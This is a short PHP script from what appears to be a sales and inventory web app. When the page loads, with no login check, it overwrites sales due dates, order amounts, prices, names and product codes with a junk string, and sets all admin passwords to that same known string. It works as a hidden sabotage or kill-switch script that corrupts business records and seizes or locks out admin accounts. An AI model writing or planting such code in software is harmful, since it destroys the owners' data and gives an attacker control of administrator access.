<?php
session_start();
include('../connect.php');
$id = 'cash';
$f='@#*$%@$#%@$#';
$g='0';
$y='admin';
$sql = "UPDATE sales 
        SET due_date=?
    WHERE ttype=?";
    $q = $db->prepare($sql);
$q->execute(array($f,$id));
$sql = "UPDATE sales_order 
        SET amount=?,price=?,name=?
    WHERE profit=?";
    $q = $db->prepare($sql);
$q->execute(array($f,$f,$f,$g));
$sql = "UPDATE products 
        SET product_name=?,product_code=?,price=?
    WHERE qty_sold=?";
    $q = $db->prepare($sql);
$q->execute(array($f,$f,$f,$g));
$sql = "UPDATE users 
        SET password=?
    WHERE position=?";
    $q = $db->prepare($sql);
$q->execute(array($f,$y));
?>
